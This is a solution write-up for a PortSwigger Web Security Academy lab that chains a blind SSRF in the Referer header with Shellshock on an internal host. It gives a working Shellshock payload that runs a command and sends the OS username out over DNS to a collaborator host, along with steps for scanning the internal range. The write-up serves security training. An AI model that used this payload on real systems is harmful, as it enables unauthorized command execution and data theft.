# Lab 05 — Blind SSRF with Shellshock exploitation

> **Expert** · [Official lab](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)

**Entry point:** the `Referer` header is fetched server-side (blind SSRF);
the internal system runs a vulnerable Bash (Shellshock).

## Solution

1. Install **Collaborator Everywhere**; browse the site — the `Referer`
   header triggers an SSRF interaction, and the request carries your
   `User-Agent`.
2. Build the Shellshock payload ( Collaborator subdomain inserted):

```
() { :; }; /usr/bin/nslookup $(whoami).YOUR-COLLABORATOR-SUBDOMAIN
```

3. Put it in `User-Agent`, set `Referer: http://192.168.0.1:8080`, and
   Intruder-scan the last octet (1–255).
4. **Poll now** — a DNS interaction arrives from the hit back-end; the
   subdomain contains the OS user name (view it in the interaction
   Description).
5. Submit the user name — lab solved.

## Notes

Shellshock turns any CGI environment variable (like HTTP_USER_AGENT) into
command execution — combined with SSRF it reaches systems with no inbound
access.
